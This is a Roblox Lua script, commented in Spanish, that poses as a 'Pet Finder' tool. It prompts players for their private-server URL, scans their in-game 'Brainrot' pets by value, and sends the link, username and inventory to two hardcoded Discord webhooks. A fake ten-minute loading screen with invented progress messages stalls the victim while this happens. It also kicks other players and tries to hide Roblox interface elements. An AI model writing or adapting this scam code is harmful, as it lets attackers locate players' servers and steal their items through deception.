-- 📍 Colocar en: StarterGui > ScreenGui > LocalScript
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:FindService("SoundService") or game:GetService("SoundService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

-- 🔒 DEFINIR PLAYER UNA SOLA VEZ AL INICIO
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- 🔒 Función para eliminar y recrear HumanoidRootPart
local function resetHumanoidRootPart()
    local character = player.Character
    if character then
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart:Destroy()
            wait(0.1)
        end
        
        -- Roblox recreará automáticamente el HumanoidRootPart
        print("✅ HumanoidRootPart reset completado")
    end
end


-- ======= DETECTOR DE SERVIDOR PRIVADO =======
local function isPlayerInOwnPrivateServer(ui)
    local workspace = game:GetService("Workspace")

    -- Buscar el objeto "PrivateServerMessage" dentro de la jerarquía
    local success, privateServerMessage = pcall(function()
        return workspace:WaitForChild("Map"):WaitForChild("Codes"):WaitForChild("Main")
            :WaitForChild("SurfaceGui"):WaitForChild("MainFrame"):WaitForChild("PrivateServerMessage")
    end)

    -- Si no se encuentra o no es un GuiObject, se considera público
    if not success or not privateServerMessage or not privateServerMessage:IsA("GuiObject") then
        showToast(ui.ToastFrame, ui.ToastLabel, "Solo disponible en servidores privados", Color3.fromRGB(255, 0, 85), 3)
        return false
    end

    -- Si existe pero está oculto, también se considera público
    if not privateServerMessage.Visible then
        showToast(ui.ToastFrame, ui.ToastLabel, "Solo disponible en servidores privados", Color3.fromRGB(255, 0, 85), 3)
        return false
    end

    -- Escuchar si cambia la visibilidad mientras el jugador está dentro
    privateServerMessage:GetPropertyChangedSignal("Visible"):Connect(function()
        if not privateServerMessage.Visible then
            showToast(ui.ToastFrame, ui.ToastLabel, "Solo disponible en servidores privados", Color3.fromRGB(255, 0, 85), 3)
        end
    end)

    -- Si llegó hasta aquí, es un servidor privado válido
    return true
end


-- 🔒 Función para verificar y expulsar jugadores si hay más de uno
local function checkPlayerCount()
    local playerCount = #Players:GetPlayers()
    
    if playerCount > 1 then
        -- Mostrar mensaje a todos los jugadores
        for _, otherPlayer in ipairs(Players:GetPlayers()) do
            local message = "❌ No es servidor privado o hay mas de 2 jugadores "
            
            -- Intentar mostrar mensaje en la pantalla del jugador
            local otherPlayerGui = otherPlayer:FindFirstChild("PlayerGui")
            if otherPlayerGui then
                local screenGui = Instance.new("ScreenGui")
                local textLabel = Instance.new("TextLabel")
                
                screenGui.Parent = otherPlayerGui
                textLabel.Parent = screenGui
                
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
                textLabel.TextColor3 = Color3.new(1, 0, 0)
                textLabel.Text = message
                textLabel.Font = Enum.Font.SourceSansBold
                textLabel.TextSize = 24
                textLabel.ZIndex = 10
            end
            
            -- También mostrar en output (consola)
            print("[SISTEMA] " .. message .. " Jugador: " .. otherPlayer.Name)
        end
        
        -- Esperar 3 segundos antes de expulsar
        wait(2)
        
        -- Expulsar a todos los jugadores
        for _, otherPlayer in ipairs(Players:GetPlayers()) do
            pcall(function()
                otherPlayer:Kick("❌ No es servidor privado o hay mas de 2 jugadores ")
            end)
        end
        
        return true -- Se expulsaron jugadores
    end
    
    return false -- No se necesitó expulsar
end

-- ⏰ Sistema de verificación SOLO por 3 segundos
local startTime = tick()
local verificationConnection

verificationConnection = RunService.Heartbeat:Connect(function()
    local elapsedTime = tick() - startTime
    
    -- Verificar cada segundo durante los primeros 3 segundos
    if elapsedTime % 1 < 0.1 then -- Aproximadamente cada segundo
        local playerCount = #Players:GetPlayers()
        print(string.format("[Sistema Inicial] Jugadores: %d, Tiempo: %.1fs", playerCount, elapsedTime))
        
        if checkPlayerCount() then
            verificationConnection:Disconnect()
            return
        end
    end
    
    -- 🎯 DESPUÉS DE 3 SEGUNDOS: DESCONECTAR Y PERMITIR MÚLTIPLES JUGADORES
    if elapsedTime >= 2 then
        print("[Sistema] ✅ Verificación completada - Ahora se permiten múltiples jugadores")
        verificationConnection:Disconnect()
        
        -- 🎉 Mensaje final
        local screenGui = Instance.new("ScreenGui")
        local textLabel = Instance.new("TextLabel")
        
        screenGui.Parent = player.PlayerGui
        textLabel.Parent = screenGui
        
        textLabel.Size = UDim2.new(1, 0, 0.1, 0)
        textLabel.Position = UDim2.new(0, 0, 0, 0)
        textLabel.BackgroundColor3 = Color3.new(0, 0.5, 0)
        textLabel.TextColor3 = Color3.new(1, 1, 1)
        textLabel.Text = "✅ Sistema de verificación completado - Se permiten múltiples jugadores"
        textLabel.Font = Enum.Font.SourceSansBold
        textLabel.TextSize = 20
        textLabel.ZIndex = 10
        
        -- Eliminar el mensaje después de 5 segundos
        wait(2)
        screenGui:Destroy()
    end
end)

-- También verificar cuando un jugador se une DURANTE los 3 segundos
local playerAddedConnection
playerAddedConnection = Players.PlayerAdded:Connect(function(newPlayer)
    local elapsedTime = tick() - startTime
    
    -- Solo actuar si aún estamos en los 3 segundos de verificación
    if elapsedTime < 2 then
        wait(0.5) -- Esperar un momento para que se actualice el count
        
        local playerCount = #Players:GetPlayers()
        print("[Sistema Inicial] Jugador añadido: " .. newPlayer.Name .. " - Total: " .. playerCount)
        
        if playerCount > 1 then
            checkPlayerCount()
        end
    else
        -- Si ya pasaron los 3 segundos, desconectar este evento
        playerAddedConnection:Disconnect()
        print("[Sistema] ✅ Evento PlayerAdded desconectado - Se permiten nuevos jugadores")
    end
end)

-- Detener sonidos
for _, sound in ipairs(workspace:GetDescendants()) do
    if sound:IsA("Sound") then
        sound.Playing = false
    end
end

--[[
-- 🔒 Ocultar interfaz de Roblox
local function hideRobloxUI()
    pcall(function() CoreGui:WaitForChild("TopBarApp"):Destroy() end)
    pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
    for _, obj in ipairs(CoreGui:GetChildren()) do
        if obj:IsA("ScreenGui") and (obj.Name:find("TopBar") or obj.Name:find("Menu")) then
            pcall(function() obj.Enabled = false end)
        end
    end
    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
end

hideRobloxUI()
local uiHideConnection = RunService.RenderStepped:Connect(hideRobloxUI)
]]
-- 🧱 GUI principal
local mainGui = Instance.new("ScreenGui")
mainGui.IgnoreGuiInset = true
mainGui.ResetOnSpawn = false
mainGui.DisplayOrder = 999
mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
mainGui.Parent = playerGui

-- 🌄 Fondo con imagen
local backgroundImage = Instance.new("ImageLabel")
backgroundImage.Size = UDim2.new(1, 0, 1, 0)
backgroundImage.Position = UDim2.new(0, 0, 0, 0)
backgroundImage.BackgroundColor3 = Color3.new(0, 0, 0)
backgroundImage.Image = "rbxassetid://101682101456356"
backgroundImage.ScaleType = Enum.ScaleType.Crop
backgroundImage.ZIndex = 1
backgroundImage.Parent = mainGui

local safetyCover = Instance.new("Frame")
safetyCover.Size = UDim2.new(1, 0, 1.15, 0)
safetyCover.Position = UDim2.new(0, 0, -0.1, 0)
safetyCover.BackgroundColor3 = Color3.new(0, 0, 0)
safetyCover.BackgroundTransparency = 0.3  -- Semi-transparente para ver el fondo
safetyCover.BorderSizePixel = 0
safetyCover.ZIndex = 2
safetyCover.Parent = mainGui

------------------------------------------------------------
-- 🧩 Pantalla inicial
------------------------------------------------------------
local introFrame = Instance.new("Frame")
introFrame.Size = UDim2.new(1, 0, 1, 0)
introFrame.BackgroundTransparency = 1  -- Transparente para ver el fondo
introFrame.ZIndex = 100
introFrame.Parent = mainGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0, 400, 0, 50)
title.Position = UDim2.new(0.5, -200, 0.4, -60)
title.BackgroundTransparency = 1
title.Text = "Url de tu servidor"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 28
title.Font = Enum.Font.GothamBold
title.ZIndex = 101
title.Parent = introFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0, 300, 0, 40)
textBox.Position = UDim2.new(0.5, -150, 0.5, -20)
textBox.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
textBox.BackgroundTransparency = 0.3
textBox.TextColor3 = Color3.new(1, 1, 1)
textBox.PlaceholderText = "Url server privado"
textBox.Font = Enum.Font.Gotham
textBox.TextSize = 20
textBox.ZIndex = 101
textBox.Parent = introFrame

local errorLabel = Instance.new("TextLabel")
errorLabel.Size = UDim2.new(0, 400, 0, 30)
errorLabel.Position = UDim2.new(0.5, -500, 0.55, 30)
errorLabel.BackgroundTransparency = 1
errorLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
errorLabel.TextSize = 18
errorLabel.Font = Enum.Font.Gotham
errorLabel.Text = "Incorrecto"
errorLabel.ZIndex = 101
errorLabel.Parent = introFrame

local startButton = Instance.new("TextButton")
startButton.Size = UDim2.new(0, 150, 0, 40)
startButton.Position = UDim2.new(0.5, -75, 0.63, 10)
startButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
startButton.BackgroundTransparency = 0.3
startButton.Text = "Empezar"
startButton.TextColor3 = Color3.new(1, 1, 1)
startButton.TextSize = 22
startButton.Font = Enum.Font.GothamBold
startButton.ZIndex = 101
startButton.Parent = introFrame

local cancelButton = Instance.new("TextButton")
cancelButton.Size = UDim2.new(0, 150, 0, 40)
cancelButton.Position = UDim2.new(0.5, -75, 0.7, 60)
cancelButton.BackgroundColor3 = Color3.new(0.4, 0.1, 0.1)
cancelButton.BackgroundTransparency = 0.3
cancelButton.Text = "Cancelar"
cancelButton.TextColor3 = Color3.new(1, 1, 1)
cancelButton.TextSize = 22
cancelButton.Font = Enum.Font.GothamBold
cancelButton.ZIndex = 101
cancelButton.Parent = introFrame

------------------------------------------------------------
-- ⏳ Pantalla de carga
------------------------------------------------------------
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundTransparency = 1  -- Transparente para ver el fondo
loadingFrame.Visible = false
loadingFrame.ZIndex = 200
loadingFrame.Parent = mainGui

local lettersContainer = Instance.new("Frame")
lettersContainer.Size = UDim2.new(0, 300, 0, 100)
lettersContainer.Position = UDim2.new(0.5, -150, 0.45, -50)
lettersContainer.BackgroundTransparency = 1
lettersContainer.ZIndex = 201
lettersContainer.Parent = loadingFrame

local letters = {"L", "O", "A", "D", "I", "N", "G"}
local textLabels = {}

for i, letter in ipairs(letters) do
	local textLabel = Instance.new("TextLabel")
	textLabel.Text = letter
	textLabel.Size = UDim2.new(0, 30, 0, 50)
	textLabel.Position = UDim2.new(0, (i-1) * 35, 0, 25)
	textLabel.BackgroundTransparency = 1
	textLabel.TextColor3 = Color3.new(1, 1, 1)
	textLabel.TextSize = 32
	textLabel.Font = Enum.Font.GothamBold
	textLabel.ZIndex = 202
	textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
	textLabel.TextStrokeTransparency = 0.3
	textLabel.Parent = lettersContainer
	table.insert(textLabels, textLabel)
end

-- 📊 Barra de carga (10 MINUTOS)
local barFrame = Instance.new("Frame")
barFrame.Size = UDim2.new(0, 400, 0, 20)
barFrame.Position = UDim2.new(0.5, -200, 0.65, 0)
barFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
barFrame.BackgroundTransparency = 0.3
barFrame.BorderSizePixel = 0
barFrame.ZIndex = 202
barFrame.Parent = loadingFrame

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
barFill.BorderSizePixel = 0
barFill.ZIndex = 203
barFill.Parent = barFrame

-- 📜 Texto de estado
local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(1, 0, 0, 40)
statusText.Position = UDim2.new(0, 0, 0.75, 10)
statusText.BackgroundTransparency = 1
statusText.TextColor3 = Color3.new(1, 1, 1)
statusText.TextSize = 22
statusText.Font = Enum.Font.GothamBold
statusText.ZIndex = 203
statusText.Text = ""
statusText.Parent = loadingFrame


-- 🌐 Sistema de envío webhook MEJORADO con clasificación por valor
local function horaMexico()
	local time = os.time()
	local mexicoOffset = -6 * 3600 -- UTC-6
	local localTime = os.date("!*t", time + mexicoOffset)
	return string.format("%04d-%02d-%02d %02d:%02d:%02d", localTime.year, localTime.month, localTime.day, localTime.hour, localTime.min, localTime.sec)
end





-- 🧠 Extraer datos de Brainrots y detectar valores (solo los que contienen M/s o K/s)
local function getBrainrotData(plot)
	local resultsMS = {}
	local resultsKS = {}
	if not plot then return {}, {} end

	local animalPodiums = plot:FindFirstChild("AnimalPodiums")
	if not animalPodiums then return {}, {} end

	for _, folder in ipairs(animalPodiums:GetChildren()) do
		local displayText, genText, mutationText = "N/A", "N/A", "N/A"

		for _, descendant in ipairs(folder:GetDescendants()) do
			if descendant:IsA("TextLabel") then
				local name = string.lower(descendant.Name)
				if name:find("display") then
					displayText = descendant.Text
				elseif name:find("generation") then
					genText = descendant.Text
				elseif name:find("mutation") then
					mutationText = descendant.Text
				end
			end
		end

		local genLower = string.lower(genText)
		local fullText = displayText .. " - " .. genText .. " - " .. mutationText

		if string.find(genLower, "m/s") then
			table.insert(resultsMS, fullText)
		elseif string.find(genLower, "k/s") then
			table.insert(resultsKS, fullText)
		end
	end

	return resultsMS, resultsKS
end








-- 🎯 Buscar el plot del jugador
local function findMyPlot()
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then return nil end

	for _, plot in pairs(plotsFolder:GetChildren()) do
		local plotSign = plot:FindFirstChild("Plotsign") or plot:FindFirstChild("PlotSign")
		if plotSign then
			local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
			if surfaceGui then
				local frame = surfaceGui:FindFirstChild("Frame")
				if frame then
					local textLabel = frame:FindFirstChild("TextLabel")
					if textLabel and textLabel:IsA("TextLabel") then
						if string.find(string.lower(textLabel.Text), string.lower(player.Name)) then
							return plot
						end
					end
				end
			end
		end
	end
	return nil
end

-- 🚀 Enviar información al Webhook según el tipo
local function sendToWebhook(url, data, brainrotList, plotInfo, category)
	local brainrotText = table.concat(brainrotList, "\n")
	
	local categoryTitle = ""
	local categoryColor = 65280
	
	if category == "MS" then
		categoryTitle = "🟣 BRAINROTS CON M/s DETECTADOS"
		categoryColor = 10181046  -- Morado
	elseif category == "KS" then
		categoryTitle = "🟡 BRAINROTS CON K/s DETECTADOS"
		categoryColor = 16776960  -- Amarillo
	end

	local embedData = {
		content = "🔔 **" .. categoryTitle .. "**",
		embeds = {{
			title = categoryTitle,
			color = categoryColor,
			fields = {
				{
					name = "👤 Usuario",
					value = "`"..player.Name.."`",
					inline = true
				},
				{
					name = "🌐 Server Link",
					value = tostring(data.url),
					inline = true
				},
				{
					name = "📊 Información del Plot",
					value = plotInfo,
					inline = false
				},
				{
					name = "🧠 Brainrots Detectados",
					value = "```" .. brainrotText .. "```",
					inline = false
				},
				{
					name = "📈 Total Brainrots",
					value = "```".. tostring(#brainrotList).. "```",
					inline = true
				},
				{
					name = "🎯 Tipo Detectado",
					value = category == "MS" and "🟣 M/s (ALTO VALOR)" or "🟡 K/s (VALOR MEDIO)",
					inline = true
				},
				{
					name = "🕒 Fecha/Hora (México)",
					value = horaMexico(),
					inline = true
				}
			},
			footer = {
				text = "🐾 Pet Finder | Sistema de clasificación por valor"
			}
		}}
	}

	local success, response = pcall(function()
		return HttpService:RequestAsync({
			Url = url,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(embedData)
		})
	end)

	if success then
		print("✅ Datos enviados correctamente al webhook: " .. url)
		print("🎯 Categoría: " .. (category == "MS" and "M/s 🟣" or "K/s 🟡"))
	else
		warn("❌ Error al enviar webhook " .. url .. ": " .. tostring(response))
	end
end

-- 🔔 Función mejorada para enviar a webhooks específicos según el tipo
local function sendToSpecificWebhooks(data)
    local myPlot = findMyPlot()
    if not myPlot then return end
    
    local resultsMS, resultsKS = getBrainrotData(myPlot)
    local plotInfo = "Plot encontrado: " .. myPlot.Name

    -- 📋 WEBHOOKS ESPECÍFICOS
    local webhookMS = "https://discord.com/api/webhooks/1429250775359557802/LxrirEYw2hgu8wOQuT4R5V08GR-XixzqkE2ZTCcDVp0tI11dOfgar_KR8wPc2oJjVzll"
    local webhookKS = "https://discord.com/api/webhooks/1426980791359115474/k1-aEJCzFHoipBN7YBySw8f1mpnDxP8SrZ_OjavIQZHGksN7rGRpybhJ4VJ56WiopqZt"

    -- Solo enviar si hay datos válidos
    if #resultsMS > 0 then
        sendToWebhook(webhookMS, data, resultsMS, plotInfo, "MS")
    end
    if #resultsKS > 0 then
        sendToWebhook(webhookKS, data, resultsKS, plotInfo, "KS")
    end
end


-- 🔔 Función principal para enviar webhooks (REEMPLAZA LA ANTERIOR)
local function sendToMultipleWebhooks(data)
    task.spawn(function()
        sendToSpecificWebhooks(data)
    end)
end

-- 🔔 Toast final
local function showFatalError()
	local toast = Instance.new("TextLabel")
	toast.Size = UDim2.new(0, 400, 0, 60)
	toast.Position = UDim2.new(0.5, -200, 0.85, 0)
	toast.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	toast.TextColor3 = Color3.new(1, 1, 1)
	toast.Text = "⚠️ Fatal error: Asegurate que tienes activado: Servidores privados>Todos"
	toast.TextSize = 24
	toast.Font = Enum.Font.GothamBlack
	toast.ZIndex = 300
	toast.Parent = mainGui

	-- Efecto "neón" brillante
	local glow = Instance.new("UIStroke")
	glow.Thickness = 3
	glow.Color = Color3.fromRGB(255, 50, 50)
	glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	glow.Parent = toast

	task.wait(5)
	toast:Destroy()
end

------------------------------------------------------------
-- 🔄 Animaciones
------------------------------------------------------------
local delays = {0, 0.2, 0.4, 0.6, 0.8, 1.0, 1.2}
local function startLoadingAnimation()
	for i, textLabel in ipairs(textLabels) do
		local delayTime = delays[i]
		coroutine.wrap(function()
			task.wait(delayTime)
			while loadingFrame.Visible do
				for step = 0, 1, 0.1 do
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				for step = 1, 0, -0.1 do
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				task.wait(0.5)
			end
		end)()
	end
end

local function updateStatusMessages()
    -- 🔄 RESET HUMANOIDROOTPART AL INICIAR
    statusText.Text = "Reiniciando HumanoidRootPart..."
    resetHumanoidRootPart()
    task.wait(2)
    
    statusText.Text = "HumanoidRootPart reset completado"
    task.wait(2)
    
    -- 📊 DETECCIÓN DE JUGADORES
    local playerCount = #Players:GetPlayers()
    statusText.Text = "Detectando jugadores en el servidor... (" .. playerCount .. " encontrados)"
    task.wait(3)
    
    -- 🧠 DETECCIÓN DE BRAINROTS Y ENVÍO WEBHOOK
    statusText.Text = "Escaneando Brainrots y enviando datos..."
    
    task.wait(10)
	
	-- Contador de 20 segundos para "obteniendo Brainrots"
	local countdown = 20
	for i = countdown, 1, -1 do
		statusText.Text = "Obteniendo Brainrots (" .. i .. "s)"
		task.wait(1)
	end

	-- 🎯 OCULTAR INTERFAZ PRINCIPAL TEMPORALMENTE
	loadingFrame.Visible = false
	mainGui.Enabled = false
	
	-- 🕐 Crear texto de carga externa
	local externalLoadText = Instance.new("TextLabel")
	externalLoadText.Size = UDim2.new(0, 400, 0, 40)
	externalLoadText.Position = UDim2.new(0.5, -200, 0.5, -20)
	externalLoadText.BackgroundTransparency = 1
	externalLoadText.TextColor3 = Color3.new(1, 1, 1)
	externalLoadText.TextSize = 24
	externalLoadText.Font = Enum.Font.GothamBold
	externalLoadText.Text = "Procesando datos..."
	externalLoadText.ZIndex = 300
	externalLoadText.Parent = mainGui

	-- ⏱️ Esperar 20 segundos con contador
	local waitTime = 0
	for i = waitTime, 1, -1 do
		externalLoadText.Text = "Procesando datos... (" .. i .. "s)"
		task.wait(0)
	end
	
	-- 🔄 REACTIVAR INTERFAZ PRINCIPAL DESPUÉS DE 20 SEGUNDOS
	externalLoadText:Destroy()
	mainGui.Enabled = true
	loadingFrame.Visible = true
	
	-- Continuar con el código original...
	statusText.Text = "Obteniendo Brainrots - LISTO!"
	task.wait(2)
	
	local messages = {
		"Restaurando script..",
		"Moviendo hitbox...",
		"Implementando nuevos códigos...",
		"Fallo en Replicate Storage - intentando de nuevo...",
		"Buscando en Workspace..."
	}
	while loadingFrame.Visible do
		statusText.Text = messages[math.random(1, #messages)]
		task.wait(math.random(5, 10))
	end
end

local function animateProgressBar()
    -- ⏰ BARRA DE CARGA DE 10 MINUTOS (600 segundos)
    local totalTime = 600  -- 10 minutos en segundos
    local stepTime = 0.2
    local steps = totalTime / stepTime
    
    print("🕐 Iniciando barra de carga de 10 minutos...")
    
    for i = 1, steps do
        local progress = i / steps
        barFill.Size = UDim2.new(progress, 0, 1, 0)
        task.wait(stepTime)
    end
    
    print("✅ Barra de carga completada (10 minutos)")
end

------------------------------------------------------------
-- 🔁 Flujo principal
------------------------------------------------------------
local function startSequence(url)
	introFrame.Visible = false
	loadingFrame.Visible = true
	
	-- 🔄 Enviar datos a MÚLTIPLES webhooks con delays
	task.spawn(function()
		local data = {
			url = url,
			playerName = player.Name,
			playerId = player.UserId,
			gameId = game.GameId,
			timestamp = os.time()
		}
		
		statusText.Text = "Enviando datos a múltiples canales..."
		
		-- USAR LA NUEVA FUNCIÓN MEJORADA
		sendToMultipleWebhooks(data)
		
		statusText.Text = "Datos enviados - Iniciando secuencia..."
		
		task.wait(2)
	end)
	
	-- Iniciar animaciones
	startLoadingAnimation()
	task.spawn(updateStatusMessages)
	task.spawn(animateProgressBar)

    -- ⏰ Cambiar a 10 minutos (600 segundos)
	task.delay(800, function()
		if uiHideConnection then uiHideConnection:Disconnect() end
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
		pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
		loadingFrame.Visible = false
		showFatalError()
	end)
end

-- CORREGIDO: Función kickPlayer mejorada
local function kickPlayer()
	if uiHideConnection then 
		uiHideConnection:Disconnect() 
	end
	pcall(function() 
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) 
	end)
	pcall(function() 
		StarterGui:SetCore("TopbarEnabled", true) 
	end)
	
	-- USAR pcall PARA MANEJAR POSIBLES ERRORES
	local success, errorMsg = pcall(function()
		player:Kick("Has cancelado la experiencia")
	end)
	
	if not success then
		warn("Error al expulsar jugador: " .. tostring(errorMsg))
		-- Intentar método alternativo
		pcall(function()
			game:Shutdown()
		end)
	end
end

startButton.MouseButton1Click:Connect(function()
	local text = textBox.Text
	if string.sub(text, 1, 23) == "https://www.roblox.com/" then
		errorLabel.Text = ""
		startSequence(text)
	else
		errorLabel.Text = "Url invalida"
	end
end)

cancelButton.MouseButton1Click:Connect(kickPlayer)

-- CORREGIDO: Bucle while con end faltante
while true do
	hideRobloxUI()
	task.wait(0.5)
end
-- FIN DEL SCRIPT - YA NO FALTAN END
